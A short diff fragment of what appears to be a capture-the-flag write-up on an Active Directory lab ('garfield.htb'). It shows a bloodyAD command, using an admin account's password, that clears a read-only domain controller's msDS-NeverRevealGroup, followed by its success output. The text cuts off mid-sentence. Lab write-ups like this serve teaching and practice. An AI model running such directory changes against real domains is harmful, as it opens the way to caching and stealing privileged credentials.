@@ -544,3 +544,9 @@ I have write on `managedBy` `msDS-RevealOnDemandGroup` and `msDS-NeverRevealGrou
 
 Just like the post above suggests there is a built in group called `RODC administrators`, and after adding `l.wilson_adm` to it i inherited these privs
 
+```python
+❯❯❯ bloodyAD --host dc01.garfield.htb -d garfield.htb -u 'l.wilson_adm' -p 'Password123!' set object 'CN=RODC01,OU=DOMAIN CONTROLLERS,DC=GARFIELD,DC=HTB' msDS-NeverRevealGroup
+[+] CN=RODC01,OU=DOMAIN CONTROLLERS,DC=GARFIELD,DC=HTB's msDS-NeverRevealGroup has been updated
+```
+
+Ill start by clearing the deny list, this is be
